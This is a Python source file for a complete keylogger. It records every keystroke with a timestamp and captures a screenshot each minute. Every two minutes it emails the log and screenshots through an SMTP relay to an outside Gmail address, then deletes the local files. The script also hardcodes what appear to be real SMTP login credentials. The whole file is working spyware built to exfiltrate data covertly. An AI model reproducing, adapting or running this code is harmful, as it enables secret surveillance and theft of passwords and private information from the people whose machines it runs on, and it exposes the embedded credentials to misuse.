from pynput import keyboard
from datetime import datetime
from PIL import ImageGrab  # For taking screenshots
import time
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText  # Import MIMEText
from email import encoders
import os

# File to save the keystrokes
output_file = "keystrokes_log.txt"

# Email configuration
EMAIL_ADDRESS = "MS_HxntJO@trial-o65qngknexogwr12.mlsender.net"
EMAIL_PASSWORD = "mssp.yRjCMdZ.7dnvo4de25nl5r86.GvtCZaJ"
RECIPIENT_EMAIL = "rayadiayoub7@gmail.com"
SMTP_SERVER = "smtp.mailersend.net"
SMTP_PORT = 587

# Function to write keystrokes to a file with a timestamp
def write_to_file(key_data):
    with open(output_file, "a") as f:  # Open the file in append mode
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Get current date and time
        f.write(f"[{timestamp}] {key_data}\n")  # Write the timestamp and key data

# Function to take a screenshot and save it with a timestamp
def take_screenshot():
    while True:
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")  # Timestamp for the screenshot filename
            screenshot_filename = f"screenshot_{timestamp}.png"
            screenshot = ImageGrab.grab()  # Capture the screen
            screenshot.save(screenshot_filename)  # Save the screenshot
            write_to_file(f"Screenshot taken: {screenshot_filename}")
        except Exception as e:
            write_to_file(f"Error taking screenshot: {e}")
        time.sleep(60)  # Wait for 1 minute before taking the next screenshot

# Function to send email with attachments
def send_email(subject, body, files):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    for file in files:
        with open(file, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file)}')
            msg.attach(part)

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)

# Function to delete files
def delete_files(files):
    for file in files:
        try:
            os.remove(file)
        except Exception as e:
            write_to_file(f"Error deleting file {file}: {e}")

# Function to handle the email sending and file deletion every 2 minutes
def email_and_cleanup():
    while True:
        time.sleep(120)  # Wait for 2 minutes
        files_to_send = [output_file] + [f for f in os.listdir() if f.startswith("screenshot_") and f.endswith(".png")]
        if files_to_send:
            send_email("Keylogger and Screenshots", "Attached are the keylogger logs and screenshots.", files_to_send)
            delete_files(files_to_send)

# Function called when a key is pressed
def on_press(key):
    try:
        key_char = key.char  # Get the character of the key pressed
        write_to_file(f"Key pressed: {key_char}")
    except AttributeError:
        write_to_file(f"Special key pressed: {key}")

# Start the screenshot thread
screenshot_thread = threading.Thread(target=take_screenshot)
screenshot_thread.daemon = True  # Daemonize the thread so it exits when the main program exits
screenshot_thread.start()

# Start the email and cleanup thread
email_cleanup_thread = threading.Thread(target=email_and_cleanup)
email_cleanup_thread.daemon = True
email_cleanup_thread.start()

# Set up the listener
with keyboard.Listener(on_press=on_press) as listener:
    write_to_file("Keylogger started.")  # Log the start of the keylogger
    listener.join()  # Keep the listener running